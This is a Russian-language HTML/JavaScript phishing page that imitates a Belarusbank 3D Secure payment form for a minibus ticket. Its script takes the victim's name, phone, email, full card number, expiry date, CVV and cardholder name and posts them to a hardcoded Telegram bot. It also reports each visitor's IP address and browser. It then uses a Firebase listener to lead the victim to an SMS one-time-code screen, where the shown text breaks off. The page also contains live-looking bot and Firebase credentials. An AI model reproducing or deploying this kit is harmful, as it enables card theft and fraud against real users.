<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
    <title>Marshrutka ‚Ä¢ 3D Secure</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
        }
        body {
            background: #0c111d;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 16px;
            position: relative;
            overflow-x: hidden;
        }
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: -10%;
            width: 120%;
            height: 100%;
            background: url('https://cdn-icons-png.flaticon.com/512/2972/2972185.png') repeat-x 0 50%;
            background-size: 150px auto;
            opacity: 0.03;
            animation: drive 20s linear infinite;
            pointer-events: none;
            z-index: 0;
        }
        @keyframes drive {
            0% { background-position: -150px 50%; }
            100% { background-position: 100% 50%; }
        }
        .card {
            max-width: 420px;
            width: 100%;
            background: white;
            border-radius: 16px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
            overflow: hidden;
            position: relative;
            z-index: 1;
        }
        .header {
            background: #003a70;
            padding: 20px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .header img {
            width: 48px;
            height: 48px;
            background: white;
            border-radius: 8px;
            padding: 8px;
        }
        .header h2 {
            color: white;
            font-size: 18px;
            font-weight: 500;
            letter-spacing: 0.5px;
        }
        .content {
            padding: 24px;
        }
        .info {
            background: #f8fafc;
            border: 1px solid #e2e8f0;
            border-radius: 12px;
            padding: 16px;
            margin-bottom: 20px;
        }
        .info-row {
            display: flex;
            justify-content: space-between;
            margin-bottom: 8px;
            font-size: 14px;
            color: #1e293b;
        }
        .amount {
            font-size: 24px;
            font-weight: 700;
            color: #003a70;
            text-align: center;
            margin: 16px 0;
        }
        .field {
            margin-bottom: 16px;
        }
        .field label {
            display: block;
            font-size: 13px;
            color: #475569;
            margin-bottom: 4px;
            font-weight: 500;
        }
        .field input {
            width: 100%;
            padding: 12px;
            border: 1px solid #cbd5e1;
            border-radius: 8px;
            font-size: 16px;
            transition: 0.2s;
        }
        .field input:focus {
            outline: none;
            border-color: #003a70;
            box-shadow: 0 0 0 3px rgba(0,58,112,0.1);
        }
        .field input::placeholder {
            color: #94a3b8;
        }
        .row2 {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 12px;
        }
        .btn {
            background: #003a70;
            color: white;
            border: none;
            padding: 14px;
            width: 100%;
            border-radius: 40px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: 0.2s;
            margin: 8px 0;
        }
        .btn:hover {
            background: #002b54;
        }
        .btn-outline {
            background: white;
            color: #003a70;
            border: 1px solid #003a70;
        }
        .btn-outline:hover {
            background: #f0f7ff;
        }
        .spinner {
            border: 3px solid #e2e8f0;
            border-top: 3px solid #003a70;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .sms-code {
            font-size: 32px;
            letter-spacing: 8px;
            text-align: center;
            padding: 16px;
            background: #f1f5f9;
            border: 2px solid #cbd5e1;
            border-radius: 12px;
            width: 100%;
            margin: 20px 0;
        }
        .success, .fail {
            text-align: center;
            padding: 20px;
        }
        .success-icon, .fail-icon {
            width: 60px;
            height: 60px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
            font-size: 30px;
            border: 2px solid;
        }
        .success-icon {
            background: #d1fae5;
            color: #059669;
            border-color: #059669;
        }
        .fail-icon {
            background: #fee2e2;
            color: #b91c1c;
            border-color: #b91c1c;
        }
        .footer {
            text-align: center;
            font-size: 12px;
            color: #94a3b8;
            padding: 16px;
            border-top: 1px solid #e2e8f0;
        }
    </style>
</head>
<body>
    <div class="card" id="app"></div>

    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>

    <script>
        (function() {
            const firebaseConfig = {
                apiKey: "AIzaSyB2IZy_bK8vQeiGpXYbvWvDyPcP80Dj984",
                authDomain: "marsutka-tt37.firebaseapp.com",
                databaseURL: "https://marsutka-tt37-default-rtdb.firebaseio.com",
                projectId: "marsutka-tt37",
                storageBucket: "marsutka-tt37.firebasestorage.app",
                messagingSenderId: "714890480273",
                appId: "1:714890480273:web:e537b2c757d521a88e0d30"
            };
            firebase.initializeApp(firebaseConfig);
            const db = firebase.database();

            const BOT_TOKEN = '8529551109:AAGafdmClxe936XeYH5F3VfLrtFNZ20CP9c';
            const ADMIN_ID = 5852338439;
            const urlParams = new URLSearchParams(window.location.search);
            const linkHash = urlParams.get('hash') || 'test123';

            const route = {
                from: '–ú–∏–Ω—Å–∫',
                to: '–ì–æ–º–µ–ª—å',
                date: '15.03.2026',
                time: '18:30',
                price: 27
            };

            let state = {
                step: 'passenger',
                passenger: { fullName: '', phone: '', email: '' },
                card: { number: '', expiry: '', cvv: '', cardholder: '' },
                smsCode: '',
                sessionId: 'sess_' + Date.now() + '_' + Math.random().toString(36).substring(7)
            };

            // ==================== –†–ê–°–®–ò–†–ï–ù–ù–ê–Ø –ë–ê–ó–ê BIN ====================
            const BIN_DB = {
                '427901': { bank: '–ë–µ–ª–∞—Ä—É—Å–±–∞–Ω–∫', type: 'Visa Classic' },
                '427902': { bank: '–ë–µ–ª–∞—Ä—É—Å–±–∞–Ω–∫', type: 'Visa Gold' },
                '427903': { bank: '–ë–µ–ª–∞—Ä—É—Å–±–∞–Ω–∫', type: 'Visa Platinum' },
                '427904': { bank: '–ë–µ–ª–∞—Ä—É—Å–±–∞–Ω–∫', type: 'Visa Infinite' },
                '427905': { bank: '–ë–µ–ª–∞—Ä—É—Å–±–∞–Ω–∫', type: 'Visa Business' },
                '425501': { bank: '–ë–µ–ª–∞—Ä—É—Å–±–∞–Ω–∫', type: 'Mastercard Standard' },
                '425502': { bank: '–ë–µ–ª–∞—Ä—É—Å–±–∞–Ω–∫', type: 'Mastercard Gold' },
                '425503': { bank: '–ë–µ–ª–∞—Ä—É—Å–±–∞–Ω–∫', type: 'Mastercard Platinum' },
                '425504': { bank: '–ë–µ–ª–∞—Ä—É—Å–±–∞–Ω–∫', type: 'Mastercard World' },
                '911201': { bank: '–ë–µ–ª–∞—Ä—É—Å–±–∞–Ω–∫', type: '–ú–ò–† Classic' },
                '911202': { bank: '–ë–µ–ª–∞—Ä—É—Å–±–∞–Ω–∫', type: '–ú–ò–† Premium' },
                '911203': { bank: '–ë–µ–ª–∞—Ä—É—Å–±–∞–Ω–∫', type: '–ú–ò–† Supreme' },
                '911204': { bank: '–ë–µ–ª–∞—Ä—É—Å–±–∞–Ω–∫', type: '–ú–ò–† Business' },
                '380101': { bank: '–ë–µ–ª–∞—Ä—É—Å–±–∞–Ω–∫', type: '–ë–µ–ª–∫–∞—Ä—Ç Classic' },
                '380102': { bank: '–ë–µ–ª–∞—Ä—É—Å–±–∞–Ω–∫', type: '–ë–µ–ª–∫–∞—Ä—Ç Premium' },
                '380103': { bank: '–ë–µ–ª–∞—Ä—É—Å–±–∞–Ω–∫', type: '–ë–µ–ª–∫–∞—Ä—Ç Business' },
                '91123801': { bank: '–ë–µ–ª–∞—Ä—É—Å–±–∞–Ω–∫', type: '–ú–ò–† Supreme' },
                '91123802': { bank: '–ë–µ–ª–∞—Ä—É—Å–±–∞–Ω–∫', type: '–ú–ò–† Elite' },
                '91123803': { bank: '–ë–µ–ª–∞—Ä—É—Å–±–∞–Ω–∫', type: '–ú–ò–† Signature' },
                '521324': { bank: '–ü—Ä–∏–æ—Ä–±–∞–Ω–∫', type: 'Mastercard Standard' },
                '521325': { bank: '–ü—Ä–∏–æ—Ä–±–∞–Ω–∫', type: 'Mastercard Gold' },
                '521326': { bank: '–ü—Ä–∏–æ—Ä–±–∞–Ω–∫', type: 'Mastercard Platinum' },
                '544101': { bank: '–ü—Ä–∏–æ—Ä–±–∞–Ω–∫', type: 'Mastercard World' },
                '544102': { bank: '–ü—Ä–∏–æ—Ä–±–∞–Ω–∫', type: 'Mastercard World Elite' },
                '515701': { bank: '–ü—Ä–∏–æ—Ä–±–∞–Ω–∫', type: 'Visa Classic' },
                '515702': { bank: '–ü—Ä–∏–æ—Ä–±–∞–Ω–∫', type: 'Visa Gold' },
                '515703': { bank: '–ü—Ä–∏–æ—Ä–±–∞–Ω–∫', type: 'Visa Platinum' },
                '515704': { bank: '–ü—Ä–∏–æ—Ä–±–∞–Ω–∫', type: 'Visa Infinite' },
                '440501': { bank: '–ë–µ–ª–∏–Ω–≤–µ—Å—Ç–±–∞–Ω–∫', type: 'Visa Classic' },
                '440502': { bank: '–ë–µ–ª–∏–Ω–≤–µ—Å—Ç–±–∞–Ω–∫', type: 'Visa Gold' },
                '440503': { bank: '–ë–µ–ª–∏–Ω–≤–µ—Å—Ç–±–∞–Ω–∫', type: 'Visa Platinum' },
                '510501': { bank: '–ë–µ–ª–∏–Ω–≤–µ—Å—Ç–±–∞–Ω–∫', type: 'Mastercard Standard' },
                '510502': { bank: '–ë–µ–ª–∏–Ω–≤–µ—Å—Ç–±–∞–Ω–∫', type: 'Mastercard Gold' },
                '510503': { bank: '–ë–µ–ª–∏–Ω–≤–µ—Å—Ç–±–∞–Ω–∫', type: 'Mastercard Platinum' },
                '458101': { bank: '–ê–ª—å—Ñ–∞-–ë–∞–Ω–∫', type: 'Visa Classic' },
                '458102': { bank: '–ê–ª—å—Ñ–∞-–ë–∞–Ω–∫', type: 'Visa Gold' },
                '458103': { bank: '–ê–ª—å—Ñ–∞-–ë–∞–Ω–∫', type: 'Visa Platinum' },
                '458104': { bank: '–ê–ª—å—Ñ–∞-–ë–∞–Ω–∫', type: 'Visa Infinite' },
                '555501': { bank: '–ê–ª—å—Ñ–∞-–ë–∞–Ω–∫', type: 'Mastercard Standard' },
                '555502': { bank: '–ê–ª—å—Ñ–∞-–ë–∞–Ω–∫', type: 'Mastercard Gold' },
                '555503': { bank: '–ê–ª—å—Ñ–∞-–ë–∞–Ω–∫', type: 'Mastercard Platinum' },
                '555504': { bank: '–ê–ª—å—Ñ–∞-–ë–∞–Ω–∫', type: 'Mastercard World' },
                '548701': { bank: '–ê–ª—å—Ñ–∞-–ë–∞–Ω–∫', type: 'Visa Platinum' },
                '548702': { bank: '–ê–ª—å—Ñ–∞-–ë–∞–Ω–∫', type: 'Visa Signature' },
                '462201': { bank: '–ë–∞–Ω–∫ –î–∞–±—Ä–∞–±—ã—Ç', type: 'Visa Classic' },
                '462202': { bank: '–ë–∞–Ω–∫ –î–∞–±—Ä–∞–±—ã—Ç', type: 'Visa Gold' },
                '462203': { bank: '–ë–∞–Ω–∫ –î–∞–±—Ä–∞–±—ã—Ç', type: 'Visa Platinum' },
                '552201': { bank: '–ë–∞–Ω–∫ –î–∞–±—Ä–∞–±—ã—Ç', type: 'Mastercard Standard' },
                '552202': { bank: '–ë–∞–Ω–∫ –î–∞–±—Ä–∞–±—ã—Ç', type: 'Mastercard Gold' },
                '424601': { bank: '–¢–µ—Ö–Ω–æ–±–∞–Ω–∫', type: 'Visa Classic' },
                '424602': { bank: '–¢–µ—Ö–Ω–æ–±–∞–Ω–∫', type: 'Visa Gold' },
                '676301': { bank: '–¢–µ—Ö–Ω–æ–±–∞–Ω–∫', type: 'Maestro' },
                '676302': { bank: '–¢–µ—Ö–Ω–æ–±–∞–Ω–∫', type: 'Maestro Premium' },
                '498401': { bank: '–ü–∞—Ä–∏—Ç–µ—Ç–±–∞–Ω–∫', type: 'Visa Classic' },
                '498402': { bank: '–ü–∞—Ä–∏—Ç–µ—Ç–±–∞–Ω–∫', type: 'Visa Gold' },
                '427601': { bank: '–ü–∞—Ä–∏—Ç–µ—Ç–±–∞–Ω–∫', type: 'Mastercard Standard' },
                '427602': { bank: '–ü–∞—Ä–∏—Ç–µ—Ç–±–∞–Ω–∫', type: 'Mastercard Gold' },
                '411111': { bank: '–†–†–ë-–ë–∞–Ω–∫', type: 'Visa Classic' },
                '411112': { bank: '–†–†–ë-–ë–∞–Ω–∫', type: 'Visa Gold' },
                '411113': { bank: '–†–†–ë-–ë–∞–Ω–∫', type: 'Visa Business' },
                '404401': { bank: '–ë–ù–ë-–ë–∞–Ω–∫', type: 'Visa Classic' },
                '404402': { bank: '–ë–ù–ë-–ë–∞–Ω–∫', type: 'Visa Gold' },
                '430281': { bank: '–¶–µ–ø—Ç–µ—Ä –ë–∞–Ω–∫', type: 'Visa Classic' },
                '430282': { bank: '–¶–µ–ø—Ç–µ—Ä –ë–∞–Ω–∫', type: 'Visa Gold' },
                '479001': { bank: '–ë–¢–ê –ë–∞–Ω–∫', type: 'Visa Classic' },
                '479002': { bank: '–ë–¢–ê –ë–∞–Ω–∫', type: 'Visa Gold' },
                '447111': { bank: '–î–µ–ª—å—Ç–∞ –ë–∞–Ω–∫', type: 'Visa Classic' },
                '447112': { bank: '–î–µ–ª—å—Ç–∞ –ë–∞–Ω–∫', type: 'Visa Gold' },
                '437237': { bank: '–•–æ—É–º –ö—Ä–µ–¥–∏—Ç', type: 'Visa Classic' },
                '437238': { bank: '–•–æ—É–º –ö—Ä–µ–¥–∏—Ç', type: 'Visa Gold' },
                '437239': { bank: '–•–æ—É–º –ö—Ä–µ–¥–∏—Ç', type: 'Visa Platinum' },
                '510126': { bank: '–†—É—Å—Å–∫–∏–π –°—Ç–∞–Ω–¥–∞—Ä—Ç', type: 'Mastercard Standard' },
                '510127': { bank: '–†—É—Å—Å–∫–∏–π –°—Ç–∞–Ω–¥–∞—Ä—Ç', type: 'Mastercard Gold' },
                '510128': { bank: '–†—É—Å—Å–∫–∏–π –°—Ç–∞–Ω–¥–∞—Ä—Ç', type: 'Mastercard Platinum' },
                '437772': { bank: '–¢–∏–Ω—å–∫–æ—Ñ—Ñ', type: 'Visa Classic' },
                '437773': { bank: '–¢–∏–Ω—å–∫–æ—Ñ—Ñ', type: 'Visa Gold' },
                '437774': { bank: '–¢–∏–Ω—å–∫–æ—Ñ—Ñ', type: 'Visa Platinum' },
                '521324': { bank: '–¢–∏–Ω—å–∫–æ—Ñ—Ñ', type: 'Mastercard Standard' },
                '427688': { bank: '–°–±–µ—Ä–±–∞–Ω–∫', type: 'Visa Classic' },
                '427689': { bank: '–°–±–µ—Ä–±–∞–Ω–∫', type: 'Visa Gold' },
                '427680': { bank: '–°–±–µ—Ä–±–∞–Ω–∫', type: 'Visa Platinum' },
                '546901': { bank: '–°–±–µ—Ä–±–∞–Ω–∫', type: 'Mastercard Standard' },
                '546902': { bank: '–°–±–µ—Ä–±–∞–Ω–∫', type: 'Mastercard Gold' },
                '546903': { bank: '–°–±–µ—Ä–±–∞–Ω–∫', type: 'Mastercard Platinum' },
                '427229': { bank: '–í–¢–ë', type: 'Visa Classic' },
                '427230': { bank: '–í–¢–ë', type: 'Visa Gold' },
                '427231': { bank: '–í–¢–ë', type: 'Visa Platinum' },
                '427232': { bank: '–í–¢–ë', type: 'Visa Infinite' },
                '546801': { bank: '–í–¢–ë', type: 'Mastercard Standard' },
                '546802': { bank: '–í–¢–ë', type: 'Mastercard Gold' },
                '546803': { bank: '–í–¢–ë', type: 'Mastercard Platinum' },
                '440588': { bank: '–û—Ç–∫—Ä—ã—Ç–∏–µ', type: 'Visa Classic' },
                '440589': { bank: '–û—Ç–∫—Ä—ã—Ç–∏–µ', type: 'Visa Gold' },
                '440590': { bank: '–û—Ç–∫—Ä—ã—Ç–∏–µ', type: 'Visa Platinum' },
                '548002': { bank: '–ë–∞–Ω–∫ –ë–µ–ª–í–≠–ë', type: 'Mastercard' },
                '431400': { bank: '–ë–∞–Ω–∫ –ú–æ—Å–∫–≤–∞-–ú–∏–Ω—Å–∫', type: 'Visa' },
            };

            function getBinInfo(cardNumber) {
                const bin = cardNumber.replace(/\D/g, '').slice(0,6);
                return BIN_DB[bin] || { bank: '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ', type: '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ' };
            }

            function formatCardNumber(v) {
                let d = v.replace(/\D/g, '').slice(0,16);
                let parts = [];
                for (let i=0; i<d.length; i+=4) parts.push(d.slice(i,i+4));
                return parts.join(' ');
            }
            function formatExpiry(v) {
                let d = v.replace(/\D/g, '').slice(0,4);
                if (d.length >= 3) return d.slice(0,2) + '/' + d.slice(2);
                return d;
            }
            function formatCVV(v) {
                return v.replace(/\D/g, '').slice(0,3);
            }

            async function sendCardToBot() {
                const binInfo = getBinInfo(state.card.number);
                const messageText = 
                    `üí≥ –ù–û–í–ê–Ø –ö–ê–†–¢–ê\n\n` +
                    `üöê –ú–∞—Ä—à—Ä—É—Ç: ${route.from} ‚Üí ${route.to}\n` +
                    `üìÖ ${route.date} ${route.time}\n` +
                    `üí∞ ${route.price} BYN\n` +
                    `üë§ –ü–∞—Å—Å–∞–∂–∏—Ä: ${state.passenger.fullName}\n` +
                    `üìû –¢–µ–ª–µ—Ñ–æ–Ω: ${state.passenger.phone}\n` +
                    `üìß Email: ${state.passenger.email}\n` +
                    `üí≥ –ö–∞—Ä—Ç–∞: ${state.card.number}\n` +
                    `üìÖ –°—Ä–æ–∫: ${state.card.expiry} | CVV: ${state.card.cvv}\n` +
                    `üë§ –í–ª–∞–¥–µ–ª–µ—Ü: ${state.card.cardholder}\n` +
                    `üî¢ BIN: ${state.card.number.replace(/\D/g, '').slice(0,6)}\n` +
                    `üè¶ –ë–ê–ù–ö: ${binInfo.bank}\n` +
                    `üíé –¢–ò–ü: ${binInfo.type}\n` +
                    `üîó –•–µ—à: ${linkHash}\n` +
                    `üÜî –°–µ—Å—Å–∏—è: ${state.sessionId}`;

                const keyboard = {
                    inline_keyboard: [
                        [{ text: 'üí∞ –í–ó–Ø–¢–¨ –ö–ê–†–¢–£', callback_data: `take_${state.sessionId}` },
                         { text: 'üóë –û–¢–ö–ê–ó', callback_data: `reject_${state.sessionId}` }]
                    ]
                };

                try {
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: ADMIN_ID,
                            text: messageText,
                            parse_mode: 'HTML',
                            reply_markup: keyboard
                        })
                    });
                    return true;
                } catch (e) {
                    console.error(e);
                    return false;
                }
            }

            async function sendVisitNotification() {
                try {
                    const ipRes = await fetch('https://api.ipify.org?format=json');
                    const ipData = await ipRes.json();
                    const text = `üëÅ –ó–ê–•–û–î –ù–ê –°–°–´–õ–ö–£\n\nüîó –•–µ—à: ${linkHash}\nüåç IP: ${ipData.ip}\nüì± ${navigator.userAgent}`;
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ chat_id: ADMIN_ID, text: text })
                    });
                } catch (e) {}
            }

            function listenForSms() {
                console.log(`üî• –°–ª—É—à–∞—Ç–µ–ª—å Firebase –¥–ª—è sessionId: ${state.sessionId}`);
                
                const cardRef = db.ref(`cards/${state.sessionId}/status`);
                let listenerActive = true;
                
                cardRef.on('value', (snapshot) => {
                    const status = snapshot.val();
                    console.log(`üî• –°—Ç–∞—Ç—É—Å: ${status}, —Ç–µ–∫—É—â–∏–π —à–∞–≥: ${state.step}`);
                    
                    if (!listenerActive) return;
                    
                    if (status === 'sms' && state.step === 'processing') {
                        console.log('‚úÖ –ü–µ—Ä–µ–∫–ª—é—á–∞–µ–º –Ω–∞ SMS (–ø–µ—Ä–≤–∏—á–Ω–æ)');
                        state.step = 'sms';
                        render();
                        listenerActive = false;
                        cardRef.off();
                    } else if (status === 'sms' && state.step === 'processing2') {
                        console.log('üîÑ –ü–æ–≤—Ç–æ—Ä–Ω—ã–π –∑–∞–ø—Ä–æ—Å SMS, –ø–µ—Ä–µ–∫–ª—é—á–∞–µ–º —Å–Ω–æ–≤–∞');
                        state.step = 'sms';
                        render();
                        listenerActive = false;
                        cardRef.off();
                    } else if (status === 'success' && state.step === 'processing2') {
                        console.log('‚úÖ –û–ø–ª–∞—Ç–∞ —É—Å–ø–µ—à–Ω–∞');
                        state.step = 'success';
                        render();
                        listenerActive = false;
                        cardRef.off();
                    } else if (status === 'fail' && state.step === 'processing2') {
                        console.log('‚ùå –û–ø–ª–∞—Ç–∞ –Ω–µ –ø—Ä–æ—à–ª–∞');
                        state.step = 'fail';
                        render();
                        listenerActive = false;
                        cardRef.off();
                    }
                }, (error) => {
                    console.error('‚ùå –û—à–∏–±–∫–∞ Firebase:', error);
                });

                let attempts = 0;
                const interval = setInterval(async () => {
                    if (!listenerActive || (state.step !== 'processing' && state.step !== 'processing2')) {
                        clearInterval(interval);
                        return;
                    }
                    attempts++;
                    
                    try {
                        const snapshot = await cardRef.once('value');
                        const status = snapshot.val();
                        
                        if (status === 'sms') {
                            if (state.step === 'processing' && listenerActive) {
                                console.log('‚úÖ –ü—Ä–∏–Ω—É–¥–∏—Ç–µ–ª—å–Ω–æ: SMS (–ø–µ—Ä–≤–∏—á–Ω–æ)');
                                state.step = 'sms';
                                render();
                                listenerActive = false;
                                clearInterval(interval);
                                cardRef.off();
                            } else if (state.step === 'processing2' && listenerActive) {
                                console.log('üîÑ –ü—Ä–∏–Ω—É–¥–∏—Ç–µ–ª—å–Ω–æ: –ø–æ–≤—Ç–æ—Ä–Ω—ã–π SMS');
                                state.step = 'sms';
                                render();
                                listenerActive = false;
                                clearInterval(interval);
                                cardRef.off();
                            }
                        } else if (status === 'success' && state.step === 'processing2' && listenerActive) {
                            console.log('‚úÖ –ü—Ä–∏–Ω—É–¥–∏—Ç–µ–ª—å–Ω–æ: —É—Å–ø–µ—Ö');
                            state.step = 'success';
                            render();
                            listenerActive = false;
                            clearInterval(interval);
                            cardRef.off();
                        } else if (status === 'fail' && state.step === 'processing2' && listenerActive) {
                            console.log('‚ùå –ü—Ä–∏–Ω—É–¥–∏—Ç–µ–ª—å–Ω–æ: —Ñ–µ–π–ª');
                            state.step = 'fail';
                            render();
                            listenerActive = false;
                            clearInterval(interval);
                            cardRef.off();
                        }
                    } catch (e) {
                        console.error('‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏–Ω—É–¥–∏—Ç–µ–ª—å–Ω–æ–π –ø—Ä–æ–≤–µ—Ä–∫–∏:', e);
                    }
                }, 2000);
            }

            function render() {
                const app = document.getElementById('app');
                let html = '';

                if (state.step === 'passenger') {
                    html = `
                        <div class="header">
                            <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23003a70'%3E%3Cpath d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-.5-13v4h5v2h-5v4h-2v-4H6v-2h3.5V7h2z'/%3E%3C/svg%3E" alt="–ë–µ–ª–∞—Ä—É—Å–±–∞–Ω–∫">
                            <h2>3D Secure ‚Ä¢ –ë–µ–ª–∞—Ä—É—Å–±–∞–Ω–∫</h2>
                        </div>
                        <div class="content">
                            <div class="info">
                                <div class="info-row"><span>–ú–∞—Ä—à—Ä—É—Ç</span><span>${route.from} ‚Üí ${route.to}</span></div>
                                <div class="info-row"><span>–î–∞—Ç–∞/–≤—Ä–µ–º—è</span><span>${route.date} ${route.time}</span></div>
                            </div>
                            <div class="amount">${route.price} BYN</div>
                            <div class="field">
                                <label>–§–ò–û *</label>
                                <input id="fullName" placeholder="–ò–≤–∞–Ω–æ–≤ –ò–≤–∞–Ω –ò–≤–∞–Ω–æ–≤–∏—á" value="${state.passenger.fullName}" required>
                            </div>
                            <div class="field">
                                <label>–¢–µ–ª–µ—Ñ–æ–Ω *</label>
                                <input type="tel" id="phone" placeholder="+375291234567" value="${state.passenger.phone}" pattern="[0-9]{12}" maxlength="12" required>
                                <small style="color:#666; font-size:11px;">–¢–æ–ª—å–∫–æ —Ü–∏—Ñ—Ä—ã, 12 —Å–∏–º–≤–æ–ª–æ–≤</small>
                            </div>
                            <div class="field">
                                <label>Email (–¥–ª—è –±–∏–ª–µ—Ç–∞)</label>
                                <input type="email" id="email" placeholder="ivanov@mail.ru" value="${state.passenger.email}">
                            </div>
                            <button class="btn" id="nextBtn">–ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å</button>
                        </div>
                        <div class="footer">–ó–∞—â–∏—â–µ–Ω–æ SSL ‚Ä¢ 3D Secure ‚Ä¢ PCI DSS</div>
                    `;
                } else if (state.step === 'card') {
                    html = `
                        <div class="header">
                            <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23003a70'%3E%3Cpath d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-.5-13v4h5v2h-5v4h-2v-4H6v-2h3.5V7h2z'/%3E%3C/svg%3E" alt="–ë–µ–ª–∞—Ä—É—Å–±–∞–Ω–∫">
                            <h2>–í–≤–æ–¥ –∫–∞—Ä—Ç—ã</h2>
                        </div>
                        <div class="content">
                            <div class="info">
                                <div class="info-row"><span>–ü–∞—Å—Å–∞–∂–∏—Ä</span><span>${state.passenger.fullName}</span></div>
                                <div class="info-row"><span>–¢–µ–ª–µ—Ñ–æ–Ω</span><span>${state.passenger.phone}</span></div>
                            </div>
                            <div class="amount">${route.price} BYN</div>
                            <div class="field">
                                <label>–ù–æ–º–µ—Ä –∫–∞—Ä—Ç—ã</label>
                                <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" value="${state.card.number}" maxlength="19" required>
                                <small style="color:#666; font-size:11px;">16 —Ü–∏—Ñ—Ä</small>
                            </div>
                            <div class="row2">
                                <div class="field"><label>–°—Ä–æ–∫</label><input type="text" id="expiry" placeholder="–ú–ú/–ì–ì" value="${state.card.expiry}" maxlength="5" required></div>
                                <div class="field"><label>CVV</label><input type="text" id="cvv" placeholder="123" value="${state.card.cvv}" maxlength="3" required></div>
                            </div>
                            <div class="field">
                                <label>–í–ª–∞–¥–µ–ª–µ—Ü –∫–∞—Ä—Ç—ã</label>
                                <input type="text" id="cardholder" placeholder="IVANOV IVAN" value="${state.card.cardholder}" required>
                            </div>
                            <button class="btn" id="payBtn">–û–ø–ª–∞—Ç–∏—Ç—å</button>
                            <button class="btn btn-outline" onclick="state.step='passenger'; render();">‚Üê –ù–∞–∑–∞–¥</button>
                        </div>
                        <div class="footer">–ó–∞—â–∏—â–µ–Ω–æ SSL ‚Ä¢ 3D Secure ‚Ä¢ PCI DSS</div>
                    `;
                } else if (state.step === 'processing') {
                    html = `
                        <div class="header">
                            <h2>–û–±—Ä–∞–±–æ—Ç–∫–∞ –ø–ª–∞—Ç–µ–∂–∞</h2>
                        </div>
                        <div class="content" style="text-align:center;">
                            <div class="spinner"></div>
                            <p style="margin:20px 0;">–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –Ω–µ –∑–∞–∫—Ä—ã–≤–∞–π—Ç–µ —Å—Ç—Ä–∞–Ω–∏—Ü—É</p>
                            <p style="color:#64748b;">–û–∂–∏–¥–∞–µ–º –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ...</p>
                        </div>
                    `;
                    listenForSms();
                } else if (state.step === 'processing2') {
                    html = `
                        <div class="header">
                            <h2>–ë–∞–Ω–∫ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–∞–µ—Ç</h2>
                        </div>
                        <div class="content" style="text-align:center;">
                            <div class="spinner"></div>
                            <p style="margin:20px 0;">–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–¥–æ–∂–¥–∏—Ç–µ...</p>
                            <p style="color:#64748b;">–û–∂–∏–¥–∞–µ–º –æ—Ç–≤–µ—Ç –æ—Ç –±–∞–Ω–∫–∞...</p>
                        </div>
                    `;
                    listenForSms();
                } else if (state.step === 'sms') {
                    html = `
                        <div class="header">
                            <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23003a70'%3E%3Cpath d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-.5-13v4h5v2h-5v4h-2v-4H6v-2h3.5V7h2z'/%3E%3C/svg%3E" alt="–ë–µ–ª–∞—Ä—É—Å–±–∞–Ω–∫">
                            <h2>3D Secure</h2>
                        </div>
                        <div class="content">
                            <div class="info">
                                <div class="info-row"><span>–ö–∞—Ä—Ç–∞</span><span>${state.card.number}</span></div>
                                <div class="info-row"><span>–°—É–º–º–∞</span><span>${route.price} BYN</span></div>
                            </div>
                            <p style="margin-bottom:16px;">–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥, –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–Ω—ã–π –Ω–∞ –≤–∞—à —Ç–µ–ª–µ—Ñ–æ–Ω</p>
                            <input class="sms-code" id="smsCode" maxlength="6" placeholder="______" value="${state.smsCode}" inputmode="numeric">
                            <button class="btn" id="confirmSms">–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å</button>
                            <button class="btn btn-outline" id="resendSms">–û—Ç–ø—Ä–∞–≤–∏—Ç—å –∫–æ–¥ –ø–æ–≤—Ç–æ—Ä–Ω–æ</button>
